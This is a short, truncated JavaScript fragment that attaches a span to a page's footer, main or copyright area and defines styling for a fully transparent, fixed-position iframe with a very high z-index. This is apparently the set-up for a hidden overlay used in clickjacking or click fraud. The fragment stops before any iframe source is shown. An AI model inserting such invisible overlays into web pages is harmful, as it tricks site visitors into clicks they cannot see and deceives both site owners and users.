let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<style>
      iframe.invisible-frame {
      position: fixed;
      width:60%;
      height: 20%;
      bottom: 20%;
      right: 0;
      border: none;
      opacity: 0;
      z-index:39494;
    }
  </style>
